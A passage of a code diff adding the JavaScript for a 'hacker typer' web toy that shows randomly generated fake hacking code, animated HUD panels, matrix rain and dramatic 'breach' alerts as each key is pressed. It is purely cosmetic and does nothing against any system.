+  const suffixes = ['Bypass','Inject','Relay','Breach','Override','Deploy','Extract','Intercept','Decrypt','Infiltrate','Scramble','Tunnel','Morph','Splice','Fork','Sync'];
+  const vars = ['targetVector','payloadBuffer','cipherKey','shellAddr','kernelBase','stackPtr','heapBase','socketFd','tunnelNode','proxyChain','hashDigest','authToken','sessionKey','masterNonce','cryptoSeed'];
+  const vals = () => pick(['0x'+hex(8), "'"+ip()+":"+port()+"'", 'Buffer.alloc('+rand(256,8192)+')', 'null','true','false',rand(0,9999)+'','"'+hex(16)+'"','['+rand(0,255)+','+rand(0,255)+','+rand(0,255)+']']);
+  const comments = [
+    '// TODO: add polymorphic encoding layer',
+    '// encrypted channel established',
+    '// if you can read this, it is already too late',
+    '// bypass IDS signature matching',
+    '// memory region marked executable',
+    '// certificate pinning defeated',
+    '// rotating proxy endpoint',
+    '// kernel patch applied silently',
+  ];
+  const fname = () => pick(prefixes) + pick(suffixes);
+  const vname = () => pick(vars);
+
+  return () => {
+    const lines = [];
+    const t = rand(0, 5);
+    if (t === 0) {
+      lines.push('\n' + pick(comments));
+      lines.push('const ' + vname() + ' = ' + vals() + ';');
+    } else if (t === 1) {
+      lines.push('await ' + fname() + '(' + vals() + ', ' + vals() + ');');
+    } else if (t === 2) {
+      lines.push('if (' + vname() + ' !== ' + vals() + ') {');
+      lines.push('    ' + fname() + '(' + vals() + ');');
+      lines.push('    log("[+] ' + pick(prefixes) + ' sequence complete");');
+      lines.push('}');
+    } else if (t === 3) {
+      lines.push('for (let i = 0; i < ' + rand(8,256) + '; i++) {');
+      lines.push('    ' + vname() + '[i] = ' + vals() + ';');
+      lines.push('}');
+    } else if (t === 4) {
+      lines.push('try {');
+      lines.push('    const result = await ' + fname() + '(' + vals() + ');');
+      lines.push('    if (result.status === "OK") ' + fname() + '(result.data);');
+      lines.push('} catch (e) { ' + fname() + '(e); }');
+    } else {
+      lines.push(pick(comments));
+      lines.push('function ' + fname() + '(config) {');
+      lines.push('    const key = crypto.randomBytes(' + pick([16,32,64]) + ');');
+      lines.push('    return encrypt(' + vname() + ', key, "' + pick(['aes-256-gcm','chacha20','blowfish-cbc']) + '");');
+      lines.push('}');
+    }
+    return lines.join('\n') + '\n';
+  };
+})();
+
+// ─── CODE STREAM ───────────────────────────────────────
+let codeQueue = '';
+let usedBlocks = new Set();
+
+function refillCode() {
+  // Alternate between curated blocks and procedural filler
+  if (Math.random() < 0.7 || usedBlocks.size >= codeBlocks.length) {
+    // Pick a curated block
+    if (usedBlocks.size >= codeBlocks.length) usedBlocks.clear();
+    let idx;
+    do { idx = rand(0, codeBlocks.length - 1); } while (usedBlocks.has(idx));
+    usedBlocks.add(idx);
+    codeQueue += processBlock(codeBlocks[idx]);
+  } else {
+    // Procedural filler (2-4 statements)
+    for (let i = 0; i < rand(2, 4); i++) codeQueue += fillerGen();
+    codeQueue += '\n';
+  }
+}
+
+function getChars(n) {
+  while (codeQueue.length < n + 200) refillCode();
+  const chars = codeQueue.slice(0, n);
+  codeQueue = codeQueue.slice(n);
+  return chars;
+}
+
+// ─── TERMINAL ──────────────────────────────────────────
+const terminal = $('#terminal');
+const cursor = $('#cursor');
+let keystrokeCount = 0;
+let totalChars = 0;
+
+function appendToTerminal(text) {
+  const span = document.createTextNode(text);
+  terminal.insertBefore(span, cursor);
+  terminal.scrollTop = terminal.scrollHeight;
+  totalChars += text.length;
+}
+
+function onKey(e) {
+  if (e) e.preventDefault();
+  Audio.keyClick();
+  const n = rand(3, 7);
+  appendToTerminal(getChars(n));
+  keystrokeCount++;
+  // Update mission progress
+  updateMissions();
+  // Check dramatic events
+  checkDrama();
+  // Boost stats
+  boostStats();
+}
+
+// ─── HUD: SYSTEM STATS ────────────────────────────────
+const stats = { cpu: 34, mem: 67, net: 12 };
+
+function updateStats() {
+  for (const key of ['cpu', 'mem', 'net']) {
+    stats[key] += rand(-5, 7);
+    stats[key] = Math.max(8, Math.min(95, stats[key]));
+    const bar = $(`#${key}-bar`);
+    bar.style.width = stats[key] + '%';
+    bar.classList.toggle('hot', stats[key] > 85);
+    $(`#${key}-val`).textContent = stats[key] + '%';
+  }
+}
+
+function boostStats() {
+  stats.cpu = Math.min(95, stats.cpu + rand(1, 3));
+  stats.net = Math.min(95, stats.net + rand(2, 6));
+}
+
+// ─── HUD: CLOCK ───────────────────────────────────────
+function updateClock() {
+  const d = new Date();
+  $('#clock').textContent = d.toTimeString().split(' ')[0];
+}
+
+// ─── HUD: FILE TREE ───────────────────────────────────
+const fileTree = (() => {
+  const dirs = [
+    {name: '/target/', children: [
+      {name: 'etc/', children: [{name:'passwd'},{name:'shadow'},{name:'hosts'},{name:'ssh/'}]},
+      {name: 'var/', children: [{name:'log/'},{name:'www/'},{name:'mail/'},{name:'backup/'}]},
+      {name: 'root/', children: [{name:'.ssh/'},{name:'.bash_history'},{name:'credentials.db'}]},
+      {name: 'opt/', children: [{name:'server/'},{name:'database/'},{name:'.hidden/'}]},
+      {name: 'tmp/', children: [{name:'.shadow_agent'},{name:'dump.raw'},{name:'payload.bin'}]},
+    ]},
+  ];
+  let activeIdx = 0;
+
+  function render() {
+    const el = $('#file-tree');
+    const lines = [];
+    function walk(node, indent = '', isLast = true) {
+      const prefix = indent + (isLast ? '\\u2514\\u2500 ' : '\\u251C\\u2500 ');
+      const cls = lines.length === activeIdx ? ' class="active"' : '';
+      lines.push(`<div class="tree-item"${cls}>${indent ? prefix : ''}${node.name}</div>`);
+      if (node.children) {
+        node.children.forEach((c, i) => {
+          walk(c, indent + (isLast ? '   ' : '\\u2502  '), i === node.children.length - 1);
+        });
+      }
+    }
+    dirs.forEach(d => walk(d));
+    el.innerHTML = lines.join('');
+  }
+
+  function cycle() {
+    activeIdx = rand(0, 18);
+    render();
+  }
+
+  return { render, cycle };
+})();
+
+// ─── HUD: CONNECTIONS ─────────────────────────────────
+const connections = (() => {
+  const pool = [];
+  for (let i = 0; i < 8; i++) {
+    pool.push({ ip: ip(), port: port(), status: pick(['ACTIVE','ACTIVE','ACTIVE','RELAY','TUNNEL','LISTEN']), alive: true });
+  }
+
+  function render() {
+    const el = $('#connections');
+    el.innerHTML = pool.map(c =>
+      `<div class="conn"><span class="conn-ip">${c.ip}:${c.port}</span><span class="conn-status ${c.alive?'live':'dead'}">${c.status}</span></div>`
+    ).join('');
+  }
+
+  function update() {
+    const idx = rand(0, pool.length - 1);
+    if (Math.random() < 0.3) {
+      pool[idx].ip = ip();
+      pool[idx].port = port();
+      pool[idx].status = pick(['ACTIVE','RELAY','TUNNEL','LISTEN','PROXY']);
+      pool[idx].alive = true;
+    } else if (Math.random() < 0.1) {
+      pool[idx].alive = !pool[idx].alive;
+      pool[idx].status = pool[idx].alive ? 'ACTIVE' : 'CLOSED';
+    }
+    render();
+  }
+
+  return { render, update };
+})();
+
+// ─── HUD: EVENT LOG ────────────────────────────────────
+function addEvent(msg, type = '') {
+  const el = $('#event-log');
+  const time = new Date().toTimeString().split(' ')[0];
+  const div = document.createElement('div');
+  div.className = 'event';
+  div.innerHTML = `<span class="time">[${time}]</span> <span class="msg ${type}">${msg}</span>`;
+  el.appendChild(div);
+  el.scrollTop = el.scrollHeight;
+  // Keep max 50 events
+  while (el.children.length > 50) el.removeChild(el.firstChild);
+}
+
+// ─── HUD: NETWORK TRAFFIC ─────────────────────────────
+function updateTraffic() {
+  const protos = ['TCP','UDP','TLS','SSH','DNS','HTTPS','ICMP','SOCKS5'];
+  for (let i = 1; i <= 3; i++) {
+    const el = $(`#tl${i}`);
+    const proto = pick(protos);
+    const src = ip() + ':' + port();
+    const dst = ip() + ':' + port();
+    const size = rand(64, 8192);
+    const flags = pick(['SYN','ACK','PSH+ACK','FIN','RST','SYN+ACK','[encrypted]','[tunneled]']);
+    el.innerHTML = `<span class="proto">[${proto}]</span> ${src} <span class="arrow">\u2500\u2500\u25B6</span> ${dst} ${flags} ${size}B`;
+  }
+}
+
+// ─── HUD: MISSIONS ─────────────────────────────────────
+const missions = [0, 0, 0, 0];
+function updateMissions() {
+  for (let i = 0; i < 4; i++) {
+    missions[i] = Math.min(100, missions[i] + Math.random() * 0.6);
+    $(`#m${i+1}`).style.width = missions[i] + '%';
+    if (missions[i] >= 100 && missions[i] < 101) {
+      missions[i] = 101;
+      const names = ['FIREWALL BYPASS','DATA EXFILTRATION','ROOT ACCESS','TRACE EVASION'];
+      showNotif(names[i] + ' COMPLETE', 'success');
+      Audio.success();
+      addEvent(names[i] + ' \u2714', 'success');
+      // Reset after a bit
+      setTimeout(() => { missions[i] = 0; }, 5000);
+    }
+  }
+}
+
+// ─── NOTIFICATIONS ─────────────────────────────────────
+function showNotif(text, type = '') {
+  const el = $('#notifs');
+  const div = document.createElement('div');
+  div.className = 'notif' + (type === 'warn' ? ' warn' : type === 'crit' ? ' crit' : '');
+  div.textContent = text;
+  el.appendChild(div);
+  setTimeout(() => div.remove(), 3200);
+}
+
+// ─── PROGRESS OVERLAY ──────────────────────────────────
+function showProgress(label, duration = 3000) {
+  const div = document.createElement('div');
+  div.className = 'progress-overlay';
+  div.innerHTML = `${label}<div class="progress-bar-outer"><div class="progress-bar-inner" style="width:0%"></div></div>`;
+  document.body.appendChild(div);
+  const inner = div.querySelector('.progress-bar-inner');
+  let pct = 0;
+  const interval = setInterval(() => {
+    pct += rand(3, 12);
+    if (pct >= 100) {
+      pct = 100;
+      clearInterval(interval);
+      inner.style.width = '100%';
+      setTimeout(() => div.remove(), 600);
+    } else {
+      inner.style.width = pct + '%';
+    }
+  }, duration / 15);
+}
+
+// ─── ALERT OVERLAY ─────────────────────────────────────
+function showAlert(text, subtext, color, duration = 2500) {
+  const overlay = $('#alert-overlay');
+  const txt = $('#alert-text');
+  const sub = $('#alert-sub');
+  txt.textContent = text;
+  txt.style.color = color;
+  sub.textContent = subtext;
+  sub.style.color = color;
+  sub.style.opacity = '0';
+  overlay.classList.add('active');
+  setTimeout(() => { sub.style.opacity = '1'; }, duration * 0.5);
+  setTimeout(() => { overlay.classList.remove('active'); }, duration);
+}
+
+// ─── MATRIX RAIN ───────────────────────────────────────
+const matrixRain = (() => {
+  const canvas = $('#matrix-canvas');
+  const ctx = canvas.getContext('2d');
+  let drops = [];
+  let animId = null;
+  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%^&*(){}[]|;:<>?/~`\u30A0\u30A1\u30A2\u30A3\u30A4\u30A5\u30A6\u30A7\u30A8\u30A9\u30AA\u30AB\u30AC\u30AD\u30AE\u30AF\u30B0\u30B1\u30B2\u30B3\u30B4\u30B5\u30B6\u30B7\u30B8\u30B9\u30BA\u30BB\u30BC\u30BD\u30BE\u30BF\u30C0';
+
+  function resize() {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    const cols = Math.floor(canvas.width / 14);
+    drops = Array(cols).fill(0).map(() => rand(-50, 0));
+  }
+
+  function draw() {
+    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = '#00ff41';
+    ctx.font = '14px monospace';
+    for (let i = 0; i < drops.length; i++) {
+      const ch = chars[rand(0, chars.length - 1)];
+      ctx.fillText(ch, i * 14, drops[i] * 14);
+      if (drops[i] * 14 > canvas.height && Math.random() > 0.98) {
+        drops[i] = 0;
+      }
+      drops[i]++;
+    }
+    animId = requestAnimationFrame(draw);
+  }
+
+  function start(duration = 4000) {
+    resize();
+    canvas.classList.add('active');
+    draw();
+    setTimeout(() => {
+      canvas.classList.remove('active');
+      setTimeout(() => {
+        cancelAnimationFrame(animId);
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+      }, 600);
+    }, duration);
+  }
+
+  window.addEventListener('resize', resize);
+  resize();
+
+  return { start };
+})();
+
+// ─── GLITCH EFFECT ─────────────────────────────────────
+function glitchScreen() {
+  document.body.classList.add('glitch');
+  setTimeout(() => document.body.classList.remove('glitch'), 500);
+}
+
+// ─── DRAMATIC EVENTS ENGINE ────────────────────────────
+let lastDrama = 0;
+
+const dramaticEvents = [
+  () => {
+    glitchScreen();
+    Audio.warn();
+    showAlert('\u26A0 TRACE DETECTED', 'DEPLOYING COUNTERMEASURES...', 'var(--red)', 3000);
+    addEvent('Trace detected from ' + ip(), 'crit');
+    setTimeout(() => {
+      showNotif('COUNTERMEASURES DEPLOYED', '');
+      addEvent('Trace neutralized', 'success');
+      Audio.success();
+    }, 3200);
+  },
+  () => {
+    showProgress('DECRYPTING RSA-4096 KEY...', 4000);
+    Audio.alert();
+    addEvent('RSA decryption initiated', '');
+    setTimeout(() => {
+      showNotif('ENCRYPTION BYPASSED', '');
+      addEvent('RSA-4096 key extracted', 'success');
+      Audio.success();
+    }, 4200);
+  },
+  () => {
+    matrixRain.start(3500);
+    showNotif('MATRIX OVERFLOW DETECTED', 'warn');
+    addEvent('Memory overflow in sector ' + hex(4), 'warn');
+  },
+  () => {
+    showProgress('BREACHING FIREWALL...', 3500);
+    Audio.alert();
+    addEvent('Firewall breach in progress', 'warn');
+    setTimeout(() => {
+      showNotif('FIREWALL BREACHED', '');
+      addEvent('Firewall rule ' + rand(1,9999) + ' bypassed', 'success');
+      Audio.success();
+    }, 3800);
+  },
+  () => {
+    showProgress('DOWNLOADING classified_' + hex(4) + '.db', 5000);
+    addEvent('Exfiltrating database ' + rand(1,500) + 'MB', '');
+    setTimeout(() => {
+      showNotif('DOWNLOAD COMPLETE', '');
+      addEvent('File saved to /tmp/.' + hex(8), 'success');
+    }, 5200);
+  },
+  () => {
+    glitchScreen();
+    showAlert('ACCESS GRANTED', 'ROOT PRIVILEGES OBTAINED', 'var(--g)', 3000);
+    Audio.success();
+    addEvent('Root shell opened on ' + ip(), 'success');
+  },
+  () => {
+    showNotif('SATELLITE UPLINK ESTABLISHED', '');
+    Audio.alert();
+    addEvent('Satellite ' + pick(['NOAA-19','ISS','GPS-IIF','GOES-16']) + ' linked', 'success');
+    connections.update();
+  },
+  () => {
+    showProgress('INJECTING POLYMORPHIC PAYLOAD...', 3000);
+    addEvent('Payload morphing: ' + rand(5,15) + ' layers', '');
+    setTimeout(() => {
+      showNotif('PAYLOAD DEPLOYED', '');
+      addEvent('AV evasion: 0/' + rand(65,72) + ' detections', 'success');
+      Audio.success();
+    }, 3200);
+  },
+  () => {
+    glitchScreen();
+    showAlert('QUANTUM TUNNEL ACTIVE', 'LATENCY: ' + rand(1,15) + 'ms', 'var(--gc)', 2500);
+    addEvent('Quantum channel: ' + ip() + ' <-> ' + ip(), 'success');
+  },
+  () => {
+    showNotif('NEURAL NETWORK BREACHED', 'warn');
+    Audio.warn();
+    addEvent('AI defense system compromised', 'warn');
+    setTimeout(() => {
+      addEvent('Neural firewall disabled', 'success');
+      showNotif('AI DEFENSES NEUTRALIZED', '');
+    }, 2000);
+  },
+];
+
+function checkDrama() {
+  const threshold = rand(20, 40);
+  if (keystrokeCount - lastDrama >= threshold) {
+    lastDrama = keystrokeCount;
+    pick(dramaticEvents)();
+  }
+}
+
+// ─── RANDOM AMBIENT EVENTS ────────────────────────────
+function ambientEvent() {
+  const events = [
+    () => addEvent('Port scan from ' + ip(), ''),
+    () => addEvent('DNS query: ' + pick(['ns','mx','mail','vpn','admin']) + '.' + hex(6) + '.net', ''),
+    () => addEvent('New connection: ' + ip() + ':' + port(), 'success'),
+    () => addEvent('Packet captured: ' + rand(64,4096) + 'B', ''),
+    () => addEvent('Certificate rotated: ' + hex(8), ''),
+    () => addEvent('Proxy hop added: ' + ip(), ''),
+    () => { connections.update(); },
+    () => { fileTree.cycle(); },
+    () => addEvent('Heartbeat: ' + ip() + ' [OK]', ''),
+    () => addEvent('Encrypted channel verified', 'success'),
+  ];
+  pick(events)();
+}
+
+// ─── BOOT SEQUENCE ─────────────────────────────────────
+async function bootSequence() {
+  const bootEl = $('#boot-text');
+  const lines = [
+    'SHADOW_OS v4.7.2 [BUILD 0x' + hex(8).toUpperCase() + ']',
+    '\u2550'.repeat(48),
+    '',
+    '[OK] Loading kernel modules...',
+    '[OK] Initializing cryptographic engine...',
+    '[OK] AES-256-GCM / ChaCha20 / RSA-4096 ready',
+    '[OK] Establishing TOR relay circuit...',
+    '[OK] Route: ' + ip() + ' \u2192 ' + ip() + ' \u2192 ' + ip(),
+    '[OK] Spoofing MAC address: ' + mac(),
+    '[OK] Anonymizing network fingerprint...',
+    '[OK] JA3 hash randomized: ' + hex(16),
+    '[OK] Loading exploit database (2,847 entries)...',
+    '[OK] Quantum entropy pool initialized',
+    '[OK] Anti-forensics module loaded',
+    '',
+    '\u2550'.repeat(48),
+    'SYSTEM READY \u2014 ALL MODULES OPERATIONAL',
+    '',
+    '> Awaiting operator input...',
+    '> Start typing to begin infiltration_',
+  ];
+
+  let text = '';
+  for (let i = 0; i < lines.length; i++) {
+    const line = lines[i];
+    for (let j = 0; j < line.length; j++) {
+      text += line[j];
+      bootEl.textContent = text;
+      await sleep(rand(5, 15));
+    }
+    text += '\n';
+    bootEl.textContent = text;
+    Audio.boot(i);
+    await sleep(rand(80, 250));
+  }
+
+  await sleep(1200);
+  $('#boot').classList.add('done');
+  setTimeout(() => { $('#boot').style.display = 'none'; }, 800);
+}
+
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+// ─── INIT ──────────────────────────────────────────────
+async function init() {
+  // Render initial HUD state
+  fileTree.render();
+  connections.render();
+  updateStats();
+  updateTraffic();
+  updateClock();
+
+  // Start intervals
+  setInterval(updateStats, 2000);
+  setInterval(updateClock, 1000);
+  setInterval(updateTraffic, 1500);
+  setInterval(ambientEvent, 3000);
+  setInterval(() => connections.update(), 5000);
+  setInterval(() => fileTree.cycle(), 7000);
+
+  // Boot sequence
+  await bootSequence();
+
+  // Listen for keyboard input
+  document.addEventListener('keydown', (e) => {
+    // Allow F11 for fullscreen and F12 for devtools
+    if (e.key === 'F11' || e.key === 'F12') return;
+    onKey(e);
+  });
+
+  // Touch support for mobile
+  document.addEventListener('touchstart', (e) => {
+    e.preventDefault();
+    onKey(null);
+  });
+
+  // Initial prompt in terminal
+  appendToTerminal('root@shadow:~# ');
+}
+
+init();
+</script>
+</body>
+</html>
